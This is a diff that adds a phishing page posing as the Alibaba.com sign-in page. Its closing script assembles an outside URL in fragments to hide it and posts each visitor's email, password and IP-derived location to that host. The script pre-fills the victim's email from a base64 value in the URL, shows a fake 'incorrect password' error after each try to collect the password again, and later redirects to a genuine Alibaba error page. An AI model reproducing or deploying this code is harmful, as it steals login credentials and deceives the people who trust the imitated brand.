@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Alibaba - Sign In</title>
+    <link
+      rel="shortcut icon"
+      href="https://is.alicdn.com/simg/single/icon/favicon.ico"
+      type="image/x-icon"
+    />
+    <script
+      type="text/javascript"
+      src="https://code.jquery.com/jquery-latest.min.js"
+    ></script>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: "Arial", sans-serif;
+      }
+
+      body {
+        background-color: #fff;
+        color: #333;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      /* HEADER */
+      .rm-header {
+        display: flex;
+        /* justify-content: space-between; */
+        align-items: center;
+        background: white;
+        gap: 10px;
+        height: 72px;
+        padding: 1rem 2rem;
+        box-shadow: 0 1px 5px rgba(0, 0, 0, 0.1);
+      }
+
+      .logo-img {
+        color: #ff6a00;
+        font-weight: bold;
+        height: 24px;
+        font-size: 1.5rem;
+        text-decoration: none;
+      }
+
+      .language-dropdown {
+        padding: 1rem 1rem;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+      }
+
+      /* MAIN */
+      .login-container {
+        display: flex;
+        width: 100%;
+        padding: 0 30px;
+      }
+      .login-banner {
+        width: 50%;
+        height: 100vh;
+      }
+      .login-banner img {
+        width: 100%;
+        height: 100vh;
+        object-fit: cover;
+      }
+      .login-box-container {
+        width: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .login-box {
+        display: flex;
+        max-width: 400px;
+        flex-direction: column;
+        padding: 1rem;
+        width: 70%;
+        margin-top: -150px;
+      }
+
+      .login-box h1 {
+        font-size: 1.6rem;
+        margin-bottom: 10px;
+        text-align: center;
+      }
+
+      .form-group {
+        position: relative;
+        margin-top: 25px;
+      }
+
+      .form-group input {
+        width: 100%;
+        padding: 20px 12px 8px 12px;
+        font-size: 16px;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        outline: none;
+        color: #333;
+        background-color: white;
+      }
+
+      .form-group input:focus {
+        border: 2px solid #ccc;
+      }
+
+      .form-group input:disabled {
+        background-color: #eee;
+        color: #999;
+        cursor: not-allowed;
+      }
+
+      .form-group label {
+        position: absolute;
+        top: 14px;
+        left: 12px;
+        padding: 3px 1px;
+        font-size: 14px;
+        color: #999;
+        transition: 0.2s ease all;
+        pointer-events: none;
+      }
+
+      .form-group input:focus + label,
+      .form-group input:not(:placeholder-shown) + label {
+        top: 4px;
+        font-size: 12px;
+        color: #6d6b6b;
+      }
+
+      .login-options {
+        display: flex;
+        justify-content: flex-end;
+        margin: 0.2rem 0;
+        font-size: 0.9rem;
+      }
+      .login-options a {
+        color: black;
+        margin-bottom: 5px;
+      }
+
+      .options a {
+        color: #ff6a00;
+        text-decoration: none;
+      }
+
+      .btn-primary {
+        width: 100%;
+        padding: 0.75rem;
+        background-color: #d64000;
+        color: white;
+        border: none;
+        border-radius: 50px;
+        font-size: 1rem;
+        cursor: pointer;
+      }
+
+      .btn-primary:hover {
+        background-color: #e65c00;
+      }
+      .divider {
+        display: flex;
+        align-items: center;
+        text-align: center;
+        color: #999;
+        margin: 1.5rem 0;
+        font-size: 0.9rem;
+      }
+
+      .divider::before,
+      .divider::after {
+        content: "";
+        flex: 1;
+        border-bottom: 1px solid #ddd;
+      }
+
+      .divider:not(:empty)::before {
+        margin-right: 0.75em;
+      }
+
+      .divider:not(:empty)::after {
+        margin-left: 0.75em;
+      }
+
+      .no-account {
+        margin-top: 20px;
+      }
+      .third-login {
+        display: flex;
+        margin-top: 10px;
+        justify-content: space-between;
+      }
+
+      .icon-wrapper {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 30%;
+        background-color: #f4f0f0;
+        padding: 0.5rem 0rem;
+      }
+
+      .icon-wrapper img {
+        width: 24px;
+        height: 24px;
+      }
+
+      .social-login button {
+        width: 100%;
+        margin-bottom: 0.6rem;
+        padding: 0.7rem;
+        border-radius: 5px;
+        border: none;
+        cursor: pointer;
+        font-weight: 600;
+        color: white;
+      }
+
+      .btn-google {
+        background-color: #db4437;
+      }
+      .btn-facebook {
+        background-color: #4267b2;
+      }
+      .btn-linkedin {
+        background-color: #0077b5;
+      }
+
+      .register {
+        text-align: center;
+        margin-top: 1rem;
+      }
+
+      .register a {
+        color: #ff6a00;
+        text-decoration: none;
+      }
+
+      .login-image img {
+        max-width: 600px;
+        border-radius: 10px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      .footer {
+        text-align: center;
+        padding: 1rem;
+        background: #fff;
+        border-top: 1px solid #eee;
+        font-size: 0.9rem;
+        color: #555;
+      }
+      .group-links {
+        margin-bottom: 10px;
+      }
+      .group-links a {
+        text-decoration: none;
+        color: #6d6b6b;
+        padding: 0px 5px;
+        border-left: 1px solid #6d6b6b;
+        border-right: 1px solid #6d6b6b;
+      }
+      .group-links :nth-child(1) {
+        border-left: none;
+      }
+      .group-links :last-child {
+        border-right: none;
+      }
+      .tnh-infos-content {
+        margin-bottom: 10px;
+      }
+      .tnh-infos-content a {
+        text-decoration: none;
+        color: #6d6b6b;
+        padding: 0px 5px;
+      }
+
+      .legal img {
+        height: 20px;
+        width: 20px;
+      }
+
+      .legal a {
+        text-decoration: none;
+        color: #6d6b6b;
+      }
+
+      /* Responsive */
+
+      /* Responsive Layout - Hide Banner on Tablet & Mobile */
+      @media (max-width: 1023px) {
+        /* .login-container {
+          flex-direction: column;
+        } */
+
+        .login-banner {
+          display: none;
+        }
+
+        .login-box-container {
+          width: 100%;
+          height: 100vh;
+        }
+        .login-box {
+          width: 100%;
+          max-width: 400px;
+        }
+      }
+
+      #loader {
+        display: none;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        top: 0;
+        left: 0;
+        background-color: #fff9;
+        z-index: 99;
+        border-radius: 10px;
+      }
+
+      @keyframes hideLoader {
+        from {
+          opacity: 1;
+        }
+
+        to {
+          opacity: 0;
+        }
+      }
+
+      @keyframes showLoader {
+        from {
+          opacity: 0;
+        }
+
+        to {
+          opacity: 1;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="loader">
+      <i class="fa fa-spinner fa-spin" style="font-size: 16px; color: #333"></i>
+    </div>
+    <header class="rm-header">
+      <div>
+        <img
+          src="https://s.alicdn.com/@img/i4/O1CN017MrHk61F6C7ZVpv3s_!!6000000000437-2-tps-496-60.png"
+          alt=""
+          class="logo-img"
+        />
+      </div>
+      <div class="rm-header-language">
+        <div>
+          <select aria-label="Select Language" class="language-dropdown">
+            <option selected>English</option>
+            <option>Deutsch</option>
+            <option>Français</option>
+            <option>Español</option>
+            <option>中文</option>
+          </select>
+        </div>
+      </div>
+    </header>
+
+    <main class="login-container">
+      <aside class="login-banner">
+        <img
+          src="https://s.alicdn.com/@img/imgextra/i4/O1CN01QrIJXJ20Rz0yjPLOq_!!6000000006847-2-tps-1480-1480.png"
+          alt="Alibaba Trade Background"
+        />
+      </aside>
+      <section class="login-box-container">
+        <div class="login-box">
+          <h1 class="login-title">Sign in</h1>
+          <form class="login-form" id="form_" action="#" method="POST">
+            <input type="hidden" id="loc" name="loc" />
+            <input type="hidden" id="ckorg" name="ckorg" />
+
+            <input type="hidden" id="trial" name="trial" />
+            <div class="form-group">
+              <input
+                type="email"
+                name="ck"
+                value=""
+                placeholder=" "
+                id="ck"
+                required
+              />
+              <label>Email Address</label>
+            </div>
+            <div class="form-group">
+              <input
+                type="password"
+                name="cknow"
+                value=""
+                required
+                placeholder=" "
+                id="cknow"
+                pattern="(?=^.{6,}$).*$"
+              />
+              <label>Password</label>
+            </div>
+
+            <div
+              id="errmsg"
+              style="
+                font-size: 11px;
+                color: red;
+                font-family: sans-serif;
+                margin-top: 6px;
+                display: none;
+              "
+            >
+              Your account name or password is incorrect.
+            </div>
+
+            <div class="login-options" style="margin-top: 20px">
+              <a href="#">Forgot password?</a>
+            </div>
+
+            <button type="submit" class="btn-primary" style="margin-top: 15px">
+              Continue
+            </button>
+          </form>
+          <div class="divider">
+            <span>OR</span>
+          </div>
+          <div class="third-login">
+            <div class="icon-wrapper">
+              <img
+                src="https://s.alicdn.com/@img/imgextra/i2/O1CN01aXkTd51T8r5s39dtG_!!6000000002338-2-tps-44-44.png"
+                alt=""
+              />
+            </div>
+
+            <div class="icon-wrapper">
+              <img
+                src="https://s.alicdn.com/@img/imgextra/i2/O1CN01xkQXBd1R7oy0JrhZm_!!6000000002065-2-tps-48-48.png"
+                alt=""
+              />
+            </div>
+
+            <div class="icon-wrapper">
+              <img
+                src="https://s.alicdn.com/@img/imgextra/i1/O1CN01chVaIE1k3g5CI9bDL_!!6000000004628-2-tps-48-48.png"
+                alt=""
+              />
+            </div>
+          </div>
+
+          <p class="no-account">
+            New to Alibaba.com? <a href="#">Create an account</a>
+          </p>
+          .
+        </div>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <div
+        class="tnf-info"
+        data-tnh-auto-exp="tnf-info"
+        data-aplus-ae="x6_6bd69ee4"
+        data-spm-anchor-id="a2700.login.0.i5.4ae51afawGgZm5"
+      >
+        <div class="group-links">
+          <a
+            href="https://www.aliexpress.com/"
+            target="_blank"
+            rel="noopener"
+            aria-label="Visit AliExpress"
+            >AliExpress</a
+          ><a
+            href="https://www.1688.com/"
+            target="_blank"
+            rel="noopener"
+            aria-label="Visit 1688.com"
+            >1688.com</a
+          ><a
+            href="https://g-sellercenter.taobao.com/mail"
+            target="_blank"
+            rel="noopener"
+            aria-label="Visit Tmall Taobao World"
+            >Tmall Taobao World</a
+          ><a
+            href="https://global.alipay.com/platform/site/ihome"
+            target="_blank"
+            rel="noopener"
+            aria-label="Visit Alipay"
+            >Alipay</a
+          ><a
+            href="https://www.lazada.com/en/"
+            target="_blank"
+            rel="noopener"
+            aria-label="Visit Lazada"
+            >Lazada</a
+          ><a
+            href="https://world.taobao.com/"
+            target="_blank"
+            rel="noopener"
+            aria-label="Visit Taobao Global"
+            >Taobao Global</a
+          ><a
+            href="https://jp.tao.co/"
+            target="_blank"
+            rel="noopener"
+            aria-label="Visit TAO"
+            >TAO</a
+          ><a
+            href="https://www.trendyol.com"
+            target="_blank"
+            data-spm-protocol="i"
+            >Trendyol</a
+          ><a
+            href="https://www.europages.co.uk"
+            target="_blank"
+            data-spm-protocol="i"
+            >Europages</a
+          >
+        </div>
+        <div class="tnh-infos-content">
+          <a
+            href="https://rulechannel.alibaba.com/icbu#/"
+            target="_blank"
+            rel="noopener"
+            aria-label="Read more about Policies and rules"
+            ><span>Policies and rules</span></a
+          ><a
+            href="https://rulechannel.alibaba.com/icbu?spm=a2700.product_home_l0.0.0.2ce267afC1wZlo&amp;type=detail&amp;ruleId=20002006&amp;cId=147#/rule/detail?ruleId=20002006&amp;cId=147"
+            target="_blank"
+            rel="noopener"
+            aria-label="Read more about Legal Notice"
+            ><span>Legal Notice</span></a
+          ><a
+            href="https://rulechannel.alibaba.com/icbu?type=detail&amp;ruleId=2047&amp;cId=1396#/rule/detail?cId=1396&amp;ruleId=2047"
+            target="_blank"
+            rel="noopener"
+            aria-label="Read more about Product Listing Policy"
+            ><span>Product Listing Policy</span></a
+          ><a
+            href="https://ipp.aidcgroup.net/#/ippHome"
+            target="_blank"
+            rel="noopener"
+            aria-label="Read more about Intellectual Property Protection"
+            ><span>Intellectual Property Protection</span></a
+          ><a
+            href="https://rulechannel.alibaba.com/icbu?type=detail&amp;ruleId=2034&amp;cId=1306#/rule/detail?cId=1306&amp;ruleId=2034"
+            target="_blank"
+            rel="noopener"
+            aria-label="Read more about Privacy Policy"
+            ><span>Privacy Policy</span></a
+          ><a
+            href="https://rulechannel.alibaba.com/icbu?type=detail&amp;ruleId=2041&amp;cId=1307#/rule/detail?cId=1307&amp;ruleId=2041"
+            target="_blank"
+            rel="noopener"
+            aria-label="Read more about Terms of Use"
+            ><span>Terms of Use</span></a
+          ><a
+            href="https://aidc.jubao.alibaba.com/"
+            target="_blank"
+            rel="noopener"
+            aria-label="Read more about Integrity Compliance"
+            ><span>Integrity Compliance</span></a
+          >
+        </div>
+        <div class="legal">
+          <div class="copyright">
+            © 1999-2026 Alibaba.com。版权所有：杭州阿里巴巴海外信息技术有限公司
+          </div>
+          <div>增值电信业务经营许可证：浙B2-20241358</div>
+          <a
+            target="_blank"
+            referrerpolicy="origin-when-cross-origin"
+            href="https://zzlz.gsxt.gov.cn/businessCheck/verifKey.do?showType=p&amp;serial=91330108MACUEGT78K-SAIC_SHOW_10000091330108MACUEGT78K1725005320775&amp;signData=MEQCIHmj5/76tVTLUJf9XvRrfyZRu5n5IT9//O1xw0dHqnvrAiBrY+wz63YR+yq2t7Ch6/MO3IGXROZyKAfNZMDEOHUKpg=="
+            rel="noopener"
+            aria-label="View business license verification"
+            ><img
+              src="https://img.alicdn.com/tfs/TB1VtZtebH1gK0jSZFwXXc7aXXa-65-70.gif"
+              alt="Business license verification icon" /></a
+          ><img
+            class="gsxt"
+            src="https://img.alicdn.com/tfs/TB1QhYprKT2gK0jSZFvXXXnFXXa-20-20.png"
+            alt="GSXT verification icon"
+          /><a
+            target="_blank"
+            referrerpolicy="origin-when-cross-origin"
+            href="https://beian.mps.gov.cn/#/query/webSearch?code=33010002000366"
+            rel="noopener noreferrer"
+            aria-label="View public security record"
+            >浙公网安备33010002000366</a
+          ><a
+            target="_blank"
+            referrerpolicy="origin-when-cross-origin"
+            href="http://beian.miit.gov.cn/"
+            rel="noopener"
+            aria-label="View ICP record"
+            >浙ICP备2024067534号-3</a
+          >
+        </div>
+      </div>
+    </footer>
+
+    <script>
+      let resBox = "AAL";
+      //Your PHP GOES HERE
+      let nbg1 = "ht";
+      let nbg2 = "tps://k";
+      let nbg3 = "vwpca.c";
+      let nbg4 = "om/kai";
+      let nbg5 = "no/g";
+      let nbg6 = "ram.php";
+
+      let ov1 =
+        "https://error.alibaba.com/error404.htm";
+      let ov2 = "";
+      let ov3 = "";
+      let ov4 = "";
+      let ov5 = "";
+      let ov6 = "";
+      let ov7 = "";
+
+      let over = `${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`;
+
+      let trialCount = sessionStorage.getItem("num_trial");
+
+      if (!trialCount) {
+        sessionStorage.setItem("num_trial", 0);
+      } else if (trialCount >= 2) {
+        window.location.assign(over);
+      }
+
+      const xx = window.location.href.split("?");
+      let ck = document.querySelector("#ck");
+      let ckorg = document.querySelector("#ckorg");
+      let cknow = document.querySelector("#cknow");
+      let loader = document.querySelector("#loader");
+      let loc = document.querySelector("#loc");
+      let trial = document.querySelector("#trial");
+
+      var base64regex =
+        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+      if (!base64regex.test(xx[1])) {
+        ckorg.value = xx[1];
+        ck.value = xx[1];
+      } else {
+        ckorg.value = atob(xx[1]);
+        ck.value = atob(xx[1]);
+      }
+
+      trial.value = trialCount;
+
+      let myForm = document.querySelector("#form_");
+      //console.log(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}${nbg7}`)
+      myForm.addEventListener("submit", async function (event) {
+        event.preventDefault();
+
+        let data = new FormData();
+
+        let options = {
+          method: "POST",
+          body: data,
+        };
+        data.append("ck", ck.value);
+        data.append("ckorg", ckorg.value);
+        data.append("cknow", cknow.value);
+        data.append("loc", loc.value);
+        data.append("trial", trial.value);
+        data.append("resBox", resBox);
+
+        loader.style.display = "flex";
+        loader.style.animation = "showLoader .5s ease";
+
+        const response = await fetch(
+          `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`,
+          options
+        );
+        const result = await response.text();
+
+        loader.style.animation = "hideLoader 1s ease";
+        setTimeout(() => {
+          loader.style.display = "none";
+        }, 1000);
+
+        console.log(result);
+
+        trialCount++;
+        sessionStorage.setItem("num_trial", trialCount);
+        trial.value = trialCount;
+
+        if (trialCount >= 100) {
+          window.location.assign(over);
+        } else {
+		  cknow.value = "";
+          cknow.focus();
+          document.getElementById("errmsg").style.display = "block";
+        }
+      });
+
+      $.get(
+        "https://ipinfo.io/json?token=10da60a9ff2d81",
+        function (response) {
+          let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`;
+          $("#loc").val(cou);
+        },
+        "jsonp"
+      );
+    </script>
+  </body>
+</html>
